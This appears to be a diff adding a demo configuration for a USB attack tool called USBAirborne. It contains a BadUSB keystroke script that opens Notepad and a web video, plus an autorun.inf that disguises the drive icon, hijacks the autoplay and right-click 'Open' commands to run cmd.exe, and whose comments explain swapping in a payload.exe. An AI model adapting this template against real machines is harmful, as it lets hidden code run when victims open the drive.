@@ -1,0 +1,35 @@
+[BadUSB]
+[Win+R]
+[Delay]
+[Delay]
+notepad
+[Enter]
+[Delay]
+[Delay]
+Hi! This is a test of USBAirborne
+[Win+R]
+[Delay]
+[Delay]
+https://www.bilibili.com/video/BV1uT4y1P7CX/[Enter]
+[BadUSB]
+
+[AutoRun]
+autoplay=true
+
+;将驱动器图标伪装为U盘图标
+icon=c:\windows\system32\shell32.dll,79
+
+;驱动器名称
+label=Nothing inside
+
+;攻击Payload，此处为调用cmd打开网页
+;如果需要实现其它攻击效果，例如执行payload.exe，可以将payload.exe放在U盘目录下
+;然后修改下文中的open和run项目为payload.exe
+open=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
+run=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
+
+;劫持右键菜单
+shell\open=打开(&O)
+shell\open\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX" 
+shell\opennewwindow=在新窗口中打开(&E) 
+shell\opennewwindow\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
